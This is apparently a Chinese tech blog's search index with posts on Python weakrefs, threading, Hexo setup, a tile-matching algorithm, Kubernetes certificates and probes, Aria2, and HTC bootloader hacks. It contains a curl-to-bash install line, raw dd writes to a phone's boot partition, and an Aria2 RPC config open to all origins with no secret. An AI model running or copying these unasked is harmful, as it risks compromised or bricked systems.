29402736 born here.Object with id 28637456 dead here.Object with id 29402736 dead here. OK了，对象被正常回收了！最后简单解说wekref中得几个函数【3】： 1. 创建弱引用： 你可以通过调用weakref模块的ref(obj[,callback])来创建一个弱引用，obj是你想弱引用的对象，callback是一个可选的函数，当因没有引用导致Python要销毁这个对象时调用。回调函数callback要求单个参数（弱引用的对象）。一旦你有了一个对象的弱引用，你就能通过调用弱引用来获取被弱引用的对象。下面的例子创建了一个对socket对象的弱引用： 12345678910&gt;&gt;&gt; from socket import * &gt;&gt;&gt; import weakref &gt;&gt;&gt; s=socket(AF_INET,SOCK_STREAM) &gt;&gt;&gt; ref=weakref.ref(s) &gt;&gt;&gt; s &lt;socket._socketobject instance at 007B4A94&gt; &gt;&gt;&gt; ref &lt;weakref at 0x81195c; to &apos;instance&apos; at 0x7b4a94&gt; &gt;&gt;&gt; ref() #调用它来访问被引用的对象 &lt;socket.socketobject instance at 007B4A94&gt; 2. 创建代理对象代理对象是弱引用对象，它们的行为就像它们所引用的对象，这就便于你不必首先调用弱引用来访问背后的对象。通过weakref模块的proxy(obj[,callback])函数来创建代理对象。使用代理对象就如同使用对象本身一样： 123456789&gt;&gt;&gt; from socket import * &gt;&gt;&gt; import weakref &gt;&gt;&gt; s=socket(AF_INET,SOCK_STREAM) &gt;&gt;&gt; ref=weakref.proxy(s) &gt;&gt;&gt; s &lt;socket._socketobject instance at 007E4874&gt; &gt;&gt;&gt; ref &lt;socket._socketobject instance at 007E4874&gt; &gt;&gt;&gt; ref.close() #对象的方法同样工作 callback参数的目的和ref函数相同。在Python删除了一个引用的对象之后，使用代理将会导致一个weakref.ReferenceError错误： 1234&gt;&gt;&gt; del s &gt;&gt;&gt; ref Traceback (most recent call last): File &quot;&lt;stdin&gt;&quot;, line 1, in ? 3. getweakrefcount(obj)和getweakrefs(obj)分别返回弱引用数和关于所给对象的引用列表 参考文献【1】 http://blog.sina.com.cn/s/blog_5357c0af0100n2q5.html 【2】http://linhs.blog.51cto.com/370259/142846/ 【3】http://longmans1985.blog.163.com/blog/static/70605475200991613556128/","link":"/hexo-blog/20130427/Python-引用，拷贝，对象回收，弱引用/"},{"title":"Python 多线程响应 Ctrl + C，用 Event 实现","text":"在用 python 编写多线程程序时，经常需要用 Ctrl + C 中止进程，可是大家都知道，在 python 中，除了主线程可以响应控制台的 Ctrl + C ，其他线程是无法捕获到的，也就是说，当主线程被中止后，其他线程也会被强制中止，这样线程们就没有机会处理自己还没有完成的工作。 而在实际应用中，我们可能会有这样的要求： 当按下 Ctrl + C 时，我们希望所有线程先处理完自己的任务，再主动停止 当所有线程停止后，主线程才终止 【这篇文章】提供了一种方法，我对其做了进一步改进，写了如下的代码，希望能起到抛砖引玉的作用： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960# -*- coding: utf-8 -*-import threadingclass MyThread(object): def __init__(self, thread_num): self.thread_num = thread_num # 线程个数 self.outLock = threading.Lock() # 控制台输出锁 self.threads = [] # 线程列表 self.interruptEvent = threading.Event() # 键盘中断事件 def beginTask(self): # 将线程加入线程列表 for i in range(self.thread_num): t_name = str(i + 1) thread = threading.Thread(target=self.doSomething, kwargs={\"t_name\": t_name}) self.threads.append(thread) # 启动线程 for thread in self.threads: thread.start() self.interruptEvent.clear() # clear # 用 isAlive 循环判断代替线程的 join 方法 while True: try: alive = False for thread in self.threads: alive = alive or thread.isAlive() if not alive: break except KeyboardInterrupt: self.interruptEvent.set() # set def doSomething(self, t_name): self.outLock.acquire() print u\"线程 %s 已启动\" % t_name self.outLock.release() while True: try: if self.interruptEvent.isSet(): # isSet raise KeyboardInterrupt ######################## # doSomething 函数代码 # ######################## except KeyboardInterrupt: ################## # 处理最后的工作 # ################## self.outLock.acquire() print u\"用户强制中止主线程，线程 %s 已中止\" % t_name self.outLock.release() break self.outLock.acquire() print u\"线程 %s 已停止\" % t_name self.outLock.release() if __name__ == \"__main__\": t = MyThread(5) t.beginTask() 程序启动后，如图 1 所示： 按下 Ctrl + C 后，如图 2 所示： 这样各个线程都有机会处理自己的任务后主动停止，随后主线程再终止。","link":"/hexo-blog/20130505/Python-多线程响应-Ctrl-C，用-Event-实现/"},{"title":"Hello Word ～ v0.2.2 背单词软件发布","text":"Hello Word ~功能基于艾宾浩斯记忆曲线，强大的单词记忆软件，为用户提供简单、科学、高效的背单词方法。 用户小学生、中学生、大学生、研究生、博士生、教师、出国留学者，以及各类英语学习者。 特性 基于艾宾浩斯记忆曲线 实时发音，男声/女声可任意切换（需要联网哦） 托盘图标人性化提醒 自由选择词库 使用 Python + Qt 开发 截图 下载 Windows x86-32bit 下载地址 x64-64bit 下载地址 Linux Fedora 17 即将推出 作者whypro @ Whypro Studio 鳗鱼工作室技术博客 2013-09-03","link":"/hexo-blog/20130903/Hello-Word-～-v0-2-2-背单词软件发布/"},{"title":"Hello, Hexo.","text":"周末折腾了半天，终于将博客从 Pelican 转到了 Hexo，在此记录一下。 方案选择首先说说方案选择，目前博客系统大致分为静态和动态两类，动态博客有 Wordpress、Ghost 等等，因为需要单独的主机和搭建环境，并且数据存在 DB 迁移起来比较费劲，所以放弃了这种方案；静态博客有 Pelican、Jekyll、Hexo 等等，后者很多优点，访问速度快，博客可直接用 Markdown 以文件的形式保存在 Github，借助 Github Pages 部署方便，不用自己搭建主机，总之个人觉得这些优点可以完爆动态博客。 笔者之前的博客是基于 Pelican 的，因为使用 Python 写的，而自己对 Python 有一种痴迷，因此之前选用了这种方案，但是慢慢发现缺点有很多。首先是渲染速度慢，当文章越来越多时，博客生成的时间就会让人难以忍受。另外 Pelican 的主题都不是很炫，找了半天都没有找到好看的主题，这也是促使我选用其他博客系统的一个原因。 其次了解了 Jekyll，它是用 Ruby 开发的，也是 Github 主推的博客系统，和 Github 无缝结合，可以直接在 Github 页面上配置、修改主题（教程在此），主题也很多，如果没有遇见 Hexo，也许我会选择 Jekyll。 Hexo 使用 Nodejs 开发，渲染速度相对于 Python 和 Ruby 来说很快，而且 CLI 设计也非常人性化，配置简单，支持的插件也有很多，使用 npm 来管理。也许正是由于开发语言的关系，Hexo 的主题质量都非常高，都非常好看，让人眼花缭乱（https://hexo.io/themes/index.html）。老实说我是被这款名叫 AlphaDust 的主题吸引了，非常有科技感，而且响应式在移动设备上也比较完美，无论是英文字体还是中文字体都支持很好，对作者的敬意油然而生。当然 NexT 也是一款非常优秀的主题，以后有机会可以尝试一下（^_^）。 安装和配置安装可以参考官方文档。 首先安装 nvm： 1$ curl -o- https://raw.githubusercontent.com/creationix/nvm/v0.33.2/install.sh | bash 安装完成后重启终端，安装 nodejs 和 hexo： 12$ nvm install stable$ npm install -g hexo-cli 创建一个新的博客项目： 123$ hexo init &lt;folder&gt;$ cd &lt;folder&gt;$ npm install 配置这里要注意的是如果使用 Github Pages，URL 包含子目录时，要注意设置 _config.yml 中的 url 和 root。 12url: http://whypro.github.io/hexo-blogroot: /hexo-blog/ 文章 URL 和文件名的配置按照个人喜好来修改： 12permalink: :year:month:day/:title/new_post_name: :year:month:day-:title.md 部署 Github Pages首先在配置文件中加入 Github 相关信息： 1234deploy: type: git repository: git@github.com:&lt;username&gt;/&lt;reponame&gt;.git branch: gh-pages 然后执行： 12$ hexo generate$ hexo deploy 后续工作至于博客的全文搜索，可以用 Swiftype 服务，有空再研究一下。 关于代码高亮可以参考 CSS classes reference。 参考文献[1] 博客从 Ghost 迁移到 Hexo","link":"/hexo-blog/20170924/hello-hexo/"},{"title":"连连看游戏消除算法","text":"今天在收到一道的面试题，觉得比较有意思，决定记录下来，整个题目与解答过程大概如下。 连连看是一种很受大家欢迎的小游戏。下面四张图给出了最基本的消除规则： 图 A 中出现在同一直线上无障碍的圈圈可以消除；图 B 中两个圈圈可以通过一次转弯消除；图 C 和图 D 中，两个圈圈可以通过两次转弯消除。 已知以下接口，表示位置(x, y)上有无障碍物： 123int isBlocked(int x, int y);return 0; // 无障碍物（位置(x,y)为空）return 1; // 有障碍物（位置(x,y)上有方块或圈圈） 请写一个函数来判断给定的任意两个圈圈是否可消除（x1, y1与x2, y2为两个圈圈的位置）： 1int remove(int x1, int y1, int x2, int y2); 水平检测水平检测用来判断两个点的纵坐标是否相等，同时判断两点间有没有障碍物。 因此直接检测两点间是否有障碍物就可以了，代码如下： 12345678910111213141516171819202122232425static bool horizon(int x1, int y1, int x2, int y2){ if (x1 == x2 &amp;&amp; y1 == y2) { return false; } if (x1 != x2) { return false; } int start_y = std::min(y1, y2) int end_y = std::max(y1, y2); for (int j = start_y; j &lt; end_y; j++) { if (isBlocked(x1, j)) { return false; } } return true;} 垂直检测垂直检测用来判断两个点的横坐标是否相等，同时判断两点间有没有障碍物。 同样地，直接检测两点间是否有障碍物，代码如下： 12345678910111213141516171819202122232425static int vertical(int x1, int y1, int x2, int y2){ if (x1 == x2 &amp;&amp; y1 == y2) { return false; } if (y1 != y2) { return false; } int start_x = std::min(x1, x2); int end_x = std::max(x1, x2); for (int i = start_x; i &lt; end_x; i++) { if (isBlocked(i, y1)) { return false; } } return true;} 一个拐角检测一个拐角检测可分解为水平检测和垂直检测，当两个同时满足时，便两点可通过一个拐角相连。即： 一个拐角检测 = 水平检测 &amp;&amp; 垂直检测 A 点至 B 点能否连接可转化为满足任意一点： A 点至 C 点的垂直检测，以及 C 点至 B 点的水平检测； A 点至 D 点的水平检测，以及 D 点至 B 点的垂直检测。 代码如下： 123456789101112131415161718192021222324252627static int turn_once(int x1, int y1, int x2, int y2){ if (x1 == x2 &amp;&amp; y1 == y2) { return false; } int c_x = x1, c_y = y2; int d_x = x2, d_y = y1; int ret = false; if (!isBlocked(c_x, c_y)) { ret |= horizon(x1, y1, c_x, c_y) &amp;&amp; vertical(c_x, c_y, x2, y2); } if (!isBlocked(d_x, d_y)) { ret |= horizon(x1, y1, d_x, d_y) &amp;&amp; vertical(d_x, d_y, x2, y2); } if (ret) { return true; } return false;} 两个拐角检测两个拐角检测可分解为一个拐角检测和水平检测或垂直检测。即： 两个拐角检测 = 一个拐角检测 &amp;&amp; (水平检测 || 垂直检测) 如图，水平、垂直分别穿过 A B 共有四条直线，扫描直线上所有不包含 A B 的点，看是否存在一点 C ，满足以下任意一项： A 点至 C 点通过水平或垂直检测，C 点至 B 点可通过一个拐角连接。（图中用 C 表示） A 点至 C 点可通过一个拐角连接，C 点至 B 点通过水平或垂直连接。（图中用 C 下划线表示） 代码如下： 12345678910111213141516171819202122232425262728293031323334353637383940static int turn_twice(int x1, int y1, int x2, int y2){ if (x1 == x2 &amp;&amp; y1 == y2) { return false; } for (int i = 0; i &lt;= MAX_X; i++) { for (int j = 0; j &lt;= MAX_Y; j++) { if (i != x1 &amp;&amp; i != x2 &amp;&amp; j != y1 &amp;&amp; j != y2) { continue; } if ((i == x1 &amp;&amp; j == y1) || (i == x2 &amp;&amp; j == y2)) { continue; } if (isBlocked(i, j)) { continue; } if (turn_once(x1, y1, i, j) &amp;&amp; (horizon(i, j, x2, y2) || vertical(i, j, x2, y2))) { return true; } if (turn_once(i, j, x2, y2) &amp;&amp; (horizon(x1, y1, i, j) || vertical(x1, y1, i, j))) { return true; } } } return false;} 整合最后，整合以上四种情况，判断两点是否能消除的代码可以写成： 123456789101112131415161718192021222324252627int remove(int x1, int y1, int x2, int y2){ int ret = false; ret = horizon(x1, y1, x2, y2); if (ret) { return 1; } ret = vertical(x1, y1, x2, y2); if (ret) { return 1; } ret = turn_once(x1, y1, x2, y2); if (ret) { return 1; } ret = turn_twice(x1, y1, x2, y2); if (ret) { return 1; } return 0;}","link":"/hexo-blog/20150721/连连看游戏消除算法/"},{"title":"Kubernetes APIServer 证书的手动签发","text":"背景有时我们需要将自定义的域名或 IP 加入到 apiserver 的证书中，以通过 kubectl 或 kubelet 等客户端的验证，这个时候就需要对 apiserver 证书中包含的 IP 和 DNS 信息做些修改。 概念首先介绍几个概念： KEY: 私钥 CSR: Certificate Signing Request 证书签名请求（公钥） CRT: Certificate 证书 x.509: 一种证书格式 PEM: X.509 证书文件具体的存储格式（有时候用 pem 代替 crt 后缀） 步骤重新生成 apiserver 证书的步骤： 创建 2048bit 的 ca.key （/etc/kubernetes/pki 目录已经存在可跳过） 1openssl genrsa -out ca.key 2048 基于 ca.key 创建 ca.crt （/etc/kubernetes/pki 已经存在可跳过） 1openssl req -x509 -new -nodes -key ca.key -subj \"/CN=kube-apiserver\" -days 10000 -out ca.crt 创建 2048bit 的 server.key （/etc/kubernetes/pki 已经存在可跳过） 1openssl genrsa -out apiserver.key 2048 编辑创建 csr 需要的配置文件 根据需要添加或修改相应字段 123456789101112131415161718192021222324252627[ req ]default_bits = 2048prompt = nodefault_md = sha256req_extensions = req_extdistinguished_name = dn [ dn ]CN = kube-apiserver [ req_ext ]subjectAltName = @alt_names [alt_names]DNS.1 = kubernetesDNS.2 = kubernetes.defaultDNS.3 = kubernetes.default.svcDNS.4 = kubernetes.default.svc.cluster.localDNS.5 = haoyu-k8s-1IP.1 = 10.96.0.1IP.2 = 172.21.1.13IP.3 = 183.2.220.210 [ v3_ext ]keyUsage=critical, digitalSignature, keyEnciphermentextendedKeyUsage=serverAuthsubjectAltName=@alt_names 创建 server.csr 1openssl req -new -key apiserver.key -out apiserver.csr -config csr.conf 基于 ca.key ca.crt server.csr 创建 server.crt 1openssl x509 -req -in apiserver.csr -CA ca.crt -CAkey ca.key -CAcreateserial -out apiserver.crt -days 10000 -extensions v3_ext -extfile csr.conf 查看生成的 server.crt 1openssl x509 -noout -text -in ./apiserver.crt 最好和原证书 diff 一下，以保证其他字段一致 对于多个 apiserver 高可用的场景，方便起见可以将生成的 apiserver.crt 和 apiserver.key 一同拷贝到多个节点的 /etc/kubernetes/pki 目录下（使用同一份私钥和证书）。 示例csr.conf: 主要关注 alt_names 的 DNS 和 IP 字段： 123456789101112131415161718192021222324252627282930313233[ req ]default_bits = 2048prompt = nodefault_md = sha256req_extensions = req_extdistinguished_name = dn [ dn ]CN = kube-apiserver [ req_ext ]subjectAltName = @alt_names [alt_names]DNS.1 = kubernetesDNS.2 = kubernetes.defaultDNS.3 = kubernetes.default.svcDNS.4 = kubernetes.default.svc.cluster.localDNS.5 = kubernetes.kube-system.svc.cluster.localDNS.6 = host1DNS.7 = host2DNS.8 = host3 IP.1 = 172.16.0.1IP.2 = 10.200.20.11IP.3 = 10.200.20.12IP.4 = 10.200.20.13IP.5 = 10.200.20.200 [ v3_ext ]keyUsage=critical, digitalSignature, keyEnciphermentextendedKeyUsage=serverAuthsubjectAltName=@alt_names cert.sh: 根据 csr.conf 自动签发 apiserver.crt，并拷贝至 /etc/kubernetes/pki 目录： 12345678910openssl req -new -key /etc/kubernetes/pki/apiserver.key -out apiserver.csr -config csr.confopenssl x509 -req -in apiserver.csr -CA /etc/kubernetes/pki/ca.crt -CAkey /etc/kubernetes/pki/ca.key -CAcreateserial -out apiserver.crt -days 10000 -extensions v3_ext -extfile csr.conf openssl x509 -noout -text -in /etc/kubernetes/pki/apiserver.crt &gt; apiserver.crt.old.txtopenssl x509 -noout -text -in apiserver.crt &gt; apiserver.crt.txtdiff apiserver.crt.txt apiserver.crt.old.txt mv /etc/kubernetes/pki/apiserver.crt /etc/kubernetes/pki/apiserver.crt.bak.$(date +%Y%m%d%H%M%S)cp apiserver.crt /etc/kubernetes/pki/apiserver.crtchmod 400 /etc/kubernetes/pki/apiserver.crt 参考 https://kubernetes.io/docs/concepts/cluster-administration/certificates/","link":"/hexo-blog/20171206/Kubernetes-APIServer-证书的手动签发/"},{"title":"Aria2 配置备忘","text":"Aria2 是一款轻量级的命令行下载工具，支持 HTTP/HTTPS、FTP、SFTP、BitTorrent 和 Metalink 等链接格式，提供 JSON-RPC 和 XML-RPC 管理接口，是一款优秀的 Linux 版迅雷替代品。 Aria2 Server1234mkdir /etc/aria2touch /etc/aria2/save-session.listmkdir /var/log/aria2 将以下内容保存至 /etc/aria2/aria2.conf： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126## '#'开头为注释内容, 选项都有相应的注释说明, 根据需要修改 #### 被注释的选项填写的是默认值, 建议在需要修改时再取消注释 #### 文件保存相关 ### 文件的保存路径(可使用绝对路径或相对路径), 默认: 当前启动位置dir=/home/whypro/aria2# 启用磁盘缓存, 0为禁用缓存, 需1.16以上版本, 默认:16M#disk-cache=32M# 文件预分配方式, 能有效降低磁盘碎片, 默认:prealloc# 预分配所需时间: none &lt; falloc ? trunc &lt; prealloc# falloc和trunc则需要文件系统和内核支持# NTFS建议使用falloc, EXT3/4建议trunc, MAC 下需要注释此项#file-allocation=none# 断点续传continue=true## 下载连接相关 ### 最大同时下载任务数, 运行时可修改, 默认:5#max-concurrent-downloads=5# 同一服务器连接数, 添加时可指定, 默认:1max-connection-per-server=10# 最小文件分片大小, 添加时可指定, 取值范围1M -1024M, 默认:20M# 假定size=10M, 文件为20MiB 则使用两个来源下载; 文件为15MiB 则使用一个来源下载min-split-size=10M# 单个任务最大线程数, 添加时可指定, 默认:5#split=5# 整体下载速度限制, 运行时可修改, 默认:0#max-overall-download-limit=0# 单个任务下载速度限制, 默认:0#max-download-limit=0# 整体上传速度限制, 运行时可修改, 默认:0#max-overall-upload-limit=0# 单个任务上传速度限制, 默认:0#max-upload-limit=0# 禁用IPv6, 默认:falsedisable-ipv6=true# 连接超时时间, 默认:60timeout=600# 最大重试次数, 设置为0表示不限制重试次数, 默认:5max-tries=0# 设置重试等待的秒数, 默认:0retry-wait=30## 进度保存相关 ### 从会话文件中读取下载任务input-file=/etc/aria2/save-session.list# 在Aria2退出时保存`错误/未完成`的下载任务到会话文件save-session=/etc/aria2/save-session.list# 定时保存会话, 0为退出时才保存, 需1.16.1以上版本, 默认:0#save-session-interval=60## RPC相关设置 ### 启用RPC, 默认:falseenable-rpc=true# 允许所有来源, 默认:falserpc-allow-origin-all=true# 允许非外部访问, 默认:falserpc-listen-all=true# 事件轮询方式, 取值:[epoll, kqueue, port, poll, select], 不同系统默认值不同#event-poll=select# RPC监听端口, 端口被占用时可以修改, 默认:6800#rpc-listen-port=6800# 设置的RPC授权令牌, v1.18.4新增功能, 取代 --rpc-user 和 --rpc-passwd 选项#rpc-secret=&lt;TOKEN&gt;# 设置的RPC访问用户名, 此选项新版已废弃, 建议改用 --rpc-secret 选项#rpc-user=&lt;USER&gt;# 设置的RPC访问密码, 此选项新版已废弃, 建议改用 --rpc-secret 选项#rpc-passwd=&lt;PASSWD&gt;# 是否启用 RPC 服务的 SSL/TLS 加密,# 启用加密后 RPC 服务需要使用 https 或者 wss 协议连接#rpc-secure=true# 在 RPC 服务中启用 SSL/TLS 加密时的证书文件,# 使用 PEM 格式时，您必须通过 --rpc-private-key 指定私钥#rpc-certificate=/path/to/certificate.pem# 在 RPC 服务中启用 SSL/TLS 加密时的私钥文件#rpc-private-key=/path/to/certificate.key## BT/PT下载相关 ### 当下载的是一个种子(以.torrent结尾)时, 自动开始BT任务, 默认:true#follow-torrent=true# BT监听端口, 当端口被屏蔽时使用, 默认:6881-6999listen-port=51413# 单个种子最大连接数, 默认:55#bt-max-peers=55# 打开DHT功能, PT需要禁用, 默认:trueenable-dht=false# 打开IPv6 DHT功能, PT需要禁用#enable-dht6=false# DHT网络监听端口, 默认:6881-6999#dht-listen-port=6881-6999# 本地节点查找, PT需要禁用, 默认:false#bt-enable-lpd=false# 种子交换, PT需要禁用, 默认:trueenable-peer-exchange=false# 每个种子限速, 对少种的PT很有用, 默认:50K#bt-request-peer-speed-limit=50K# 客户端伪装, PT需要peer-id-prefix=-TR2770-user-agent=Transmission/2.77# 当种子的分享率达到这个数时, 自动停止做种, 0为一直做种, 默认:1.0seed-ratio=0# 强制保存会话, 即使任务已经完成, 默认:false# 较新的版本开启后会在任务完成后依然保留.aria2文件#force-save=false# BT校验相关, 默认:true#bt-hash-check-seed=true# 继续之前的BT任务时, 无需再次校验, 默认:falsebt-seed-unverified=true# 保存磁力链接元数据为种子文件(.torrent文件), 默认:falsebt-save-metadata=true## 其他相关 ### 日志级别，可以为debug, info, notice, warn 或 errorlog-level=notice# 日志文件，根据实际情况修改log=/var/log/aria2/aria2.log# 下载进度输出的间隔时间summary-interval=120# 是否以守护进程的方式启动daemon=true Systemd Service将以下内容保存至 aria2c.service 放入 /lib/systemd/system/ 目录 12345678910111213[Unit]Description=aria2c -- file download managerAfter=network.target[Service]Type=forkingUser=%iWorkingDirectory=%hEnvironment=VAR=/var/%iExecStart=/usr/bin/aria2c --conf-path=/etc/aria2/aria2.conf[Install]WantedBy=multi-user.target 之后执行 123systemctl daemon-reloadsystemctl start aria2csystemctl enable aria2c Web UIAria2WebUI http://webui-aria2.ghostry.cn/ https://ziahamza.github.io/webui-aria2/ YAAW: Chrome 插件 参考文献[1] Raspberry Pi技术笔记之四：使用aria2打造下载利器[2] Aria2 &amp; YAAW 使用说明[3] aria2c docs","link":"/hexo-blog/20171015/Aria2-配置备忘/"},{"title":"HTC 刷机备忘","text":"笔者对 HTC 手机有着深厚的感情，从 HTC G2 到 HTC M8，经历了 HTC 的鼎盛和衰落。本文记录了一些常用的刷机方法和 hack 命令，以作备忘。 官方 Unlock/ReLock 方法Unlock获取解锁 token1fastboot oem get_identifier_token 123456789101112131415161718&lt;&lt;&lt;&lt; Identifier Token Start &gt;&gt;&gt;&gt;XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX&lt;&lt;&lt;&lt;&lt; Identifier Token End &gt;&gt;&gt;&gt;&gt; 获取解锁码前往 http://www.htcdev.com/bootloader 获取官方解锁码。 刷入解锁码1fastboot flash unlocktoken Unlock_code.bin Relock1fastboot oem lock 刷入 Recovery 方法常规方法12adb reboot bootloaderfastboot flash recovery recovery.img 重启后进入 recovery 界面 12fastboot rebootadb reboot recovery 或者可以在 fastboot 界面直接进入 recovery 在 S-OFF + LOCKED 状态下刷入第三方 Recovery 的方法准备 ZIP 文件在 S-OFF + LOCKED 情况下通过 adb 工具线刷时，所用的 recovery.zip 包里必须包括 android-info.txt 和 recovery.img。而这个 android-info.txt 的内容必须符合你的手机信息，以我的 Sprint 版为例，其内容是： 1234567modelid: PN0720000cidnum: 11111111mainver: 5.03.651.3btype:1aareport:1DelCache:1hbootpreupdate:3 查询以上信息的方法为：在 adb 中输入 fastboot getvar all 即可看到，然后将所需的 modelid、cidnum、mainver 信息修改到 android-info.txt 文件中。 android-info.txt 文件可以从官方 RUU 中提取，然后把上面查询到的信息替换到里面即可。 最后将 recovery.img 和 android-info.txt 一起打包到 zip 压缩包中，并放入 adb 工具的文件夹里即可开始下面步骤了。 （刷 radio 也是同理，必须在 zip 压缩包中加入 android-info.txt。） 123adb reboot bootloaderfastboot oem rebootRUUfastboot flash zip recovery.zip 1fastboot reboot BootLoader 状态随意修改（需要 S-OFF）查看状态1dd if=/dev/block/mmcblk0p3 bs=1 skip=33796 count=4 LOCKto LOCK your bootloader,enter the following: 12345678910111213adb devicesadb shellsu (if needed to get a # prompt)# (i would very strongly recomend you copy/paste this)echo -ne '\\x00\\x00\\x00\\x00' | dd of=/dev/block/mmcblk0p3 bs=1 seek=33796# (exit a second time if you need to to get back to a normal &gt; prompt)exitadb reboot bootloader verify you are now locked UNLOCKto UNLOCK your bootloader,enter the following: 12345678910111213adb devicesadb shellsu (if needed to get a # prompt)# (i would very strongly recomend you copy/paste this)echo -ne \"HTCU\" | dd of=/dev/block/mmcblk0p3 bs=1 seek=33796# (exit a second time if you need to to get back to a normal &gt; prompt)exitadb reboot bootloader verify you are now unlocked RELOCKto RELOCK your bootloader,enter the following: 12345678910111213adb devicesadb shellsu (if needed to get a # prompt)# (i would very strongly recomend you copy/paste this)echo -ne \"HTCL\" | dd of=/dev/block/mmcblk0p3 bs=1 seek=33796# (exit a second time if you need to to get back to a normal &gt; prompt)exitadb reboot bootloader verify you are now relocked 参考http://bbs.gfan.com/android-7235658-1-1.html https://androidforums.com/threads/how-to-lock-unlock-your-bootloader-without-htcdev-s-off-required.916138/ HTC 测试指令测试指令： 1*#*#3424#*#* 工程模式 1*#*#4636#*#*","link":"/hexo-blog/20181020/HTC-刷机备忘/"},{"title":"Kubernetes 容器生命周期管理","text":"健康检查和就绪检查健康检查（Liveness Probe）如果设置了 livenessProbe，k8s (kubelet) 会每隔 n 秒执行预先配置的行为来检查容器是否健康 当健康检查失败时，k8s 会认为容器已经挂掉，会根据 restartPolicy 来对容器进行重启或其他操作。 每次检查有 3 种结果，Success、Failure、Unknown 如果不配置，默认的检查状态为 Success 什么时候不需要健康检查：如果服务在异常后会自动退出或 crash，就不必配置健康检查，k8s 会按照重启策略来自动操作。 什么时候需要健康检查：相反，如果服务异常必须由 k8s 主动介入来重启容器，就需要配置健康检查 就绪检查（Readiness Probe）如果设置了 readinessProbe，k8s (kubelet) 会每隔 n 秒检查容器对外提供的服务是否正常 当就绪检查失败时，k8s 会将 Pod 标记为 Unready，将 Pod IP 从 endpoints 中剔除，即不会让之后的流量通过 service 发送过来。 在首次检查之前，初始状态为 Failure 如果不配置，默认的状态为 Success 什么时候需要就绪检查：如果在服务启动后、初始化完成之前不想让流量过来，就需要配置就绪检查。 什么时候不需要就绪检查：除了上述场景，在 Pod 被删除时，k8s 会主动将 Pod 置为 UnReady 状态，之后的流量也不会过来，因此针对这种情况不必配置就绪检查。 参数健康／就绪检查支持以下参数： initialDelaySeconds: 容器启动后，进行首次检查的等待时间（秒） periodSeconds: 每次检查的间隔时间（秒） timeoutSeconds: 执行检查的超时时间（秒），默认值为 1，最小值是 1 successThreshold: 检查失败时，连续成功 n 次后，认为该容器的健康／就绪检查成功。默认值为 1，最小值是 1，对于健康检查必须为 1 failureThreshold: 连续失败 n 次后，认为该容器的健康／就绪检查失败。默认值为 3，最小值是 1 检查方式Exec 方式12345livenessProbe: exec: command: - cat - /tmp/healthy HTTP GET 请求方式1234567livenessProbe: httpGet: path: /healthz port: 8080 httpHeaders: - name: X-Custom-Header value: Awesome 支持的参数包括： host: 目标主机地址，默认值为 pod IP scheme: HTTP 或 HTTPS，默认为 HTTP path: 访问路径 httpHeaders: 自定义请求头 port: 目标端口号，有效值 1~65535 TCP Socket 方式123livenessProbe: tcpSocket: port: 8080 支持的参数包括： host: 目标主机地址，默认值为 pod IP port: 目标端口号，有效值 1~65535 容器重启策略restartPolicy 是 livenessProbe Failure 后执行的策略，作用于 Pod 的每个容器，可以配置为 Always、OnFaiiure、Never，默认值为 Always。 restartPolicy 只会影响本机节点重启容器的策略，并不会影响 Pod 重新调度的行为，重启的方式按照时间间隔（10s, 20s, 40s, …, 5min）来重启容器，并且每 10min 重置间隔时间 重启策略 restartPolicy 的配置通过以下几个场景来举例说明： Pod Running 状态，包含 1 个容器，容器正常退出 记录 completion 事件 Always: 重启容器，Pod phase 保持 Running 状态 OnFaiiure: 不重启容器，Pod phase 变为 Succeeded Never: 不重启容器，Pod phase 变为 Succeeded Pod Running 状态，包含 1 个容器，容器异常退出 记录 failure 事件 Always: 重启容器，Pod phase 保持 Running 状态 OnFaiiure: 重启容器，Pod phase 保持 Running 状态 Never: 不重启容器，Pod phase 变为 Failed Pod Running 状态，包含 2 个容器，其中一个容器异常退出 记录 failure 事件 Always: 重启容器，Pod phase 保持 Running 状态 OnFaiiure: 重启容器，Pod phase 保持 Running 状态 Never: 不重启容器，Pod phase 保持 Running 状态 此时如果第二个容器退出（无论正常还是异常） 记录 failure 事件 Always: 重启容器，Pod phase 保持 Running 状态 OnFaiiure: 重启容器，Pod phase 保持 Running 状态 Never: 不重启容器，Pod phase 变为 Failed Pod Running 状态，包含 1 个容器，容器被 OOM (out of memory) killed 记录 OOM 事件 Always: 重启容器，Pod phase 保持 Running 状态 OnFaiiure: 重启容器，Pod phase 保持 Running 状态 Never: 不重启容器，Pod phase 变为 Failed Pod Running 状态，遇到节点异常（比如磁盘挂掉、segmented out） 根据异常原因记录相应事件 无论设置为哪种策略，Pod 状态变为 Failed，并尝试在其他节点重新创建（如果 Pod 是通过 Controller 管理的） 容器生存周期事件处理k8s 在容器创建或终止时会发送 postStart 或 preStop 事件，用户可以通过配置 handler，对这两个容器事件进行处理。 k8s 在容器创建之后发送 postStart 事件，postStart handler 是异步执行，所以并不保证会在容器的 entrypoint 之前执行，不过容器代码会阻塞住直到 postStart handler 执行完成。执行成功后，容器状态才会设为 Running k8s 在容器 terminate 之前发送 preStop 事件，terminate 行为会阻塞，直到 preStop handler 同步执行成功或者 Pod 配置的 grace period 超时 (terminationGracePeriodSeconds)。注意：如果不是主动终止，k8s 不会发送 preStop 事件（比如正常退出）。 如果 postStart 或 preStop handler 执行失败，k8s 直接 kill 掉容器。 handler 执行方式Exec 方式1234lifecycle: postStart: exec: command: [&quot;/bin/sh&quot;, 